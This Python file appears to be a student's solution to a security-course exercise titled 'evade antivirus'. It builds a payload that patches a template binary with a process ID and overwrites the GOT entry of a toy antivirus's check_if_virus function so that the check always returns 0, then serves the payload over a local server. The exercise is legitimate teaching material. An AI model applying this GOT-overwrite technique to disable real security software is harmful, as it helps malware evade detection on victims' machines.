import addresses
import evasion


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the GOT entry for check_if_virus.

        Reminder: We want to replace it with another function of a similar
        signature, that will return 0.

        Notes:
        1. You can assume we already compiled q3.c into q3.template.
        2. Use addresses.CHECK_IF_VIRUS_GOT, addresses.CHECK_IF_VIRUS_ALTERNATIVE
           (and addresses.address_to_bytes).

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q3.template'
        # TODO: IMPLEMENT THIS FUNCTION

        with open(PATH_TO_TEMPLATE, 'rb') as template:
            template_bin = bytearray(template.read())
            
            pid_idx = template_bin.find(addresses.address_to_bytes(0x1234567a))
            got_address_idx = template_bin.find(addresses.address_to_bytes(0x1234567b))
            alt_address_idx = template_bin.find(addresses.address_to_bytes(0x1234567c))
            
            template_bin[pid_idx:pid_idx+4] = pid.to_bytes(4, byteorder='little')
            template_bin[got_address_idx:got_address_idx+4] =  addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_GOT)
            template_bin[alt_address_idx:alt_address_idx+4] =  addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_ALTERNATIVE)

            return bytes(template_bin)

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
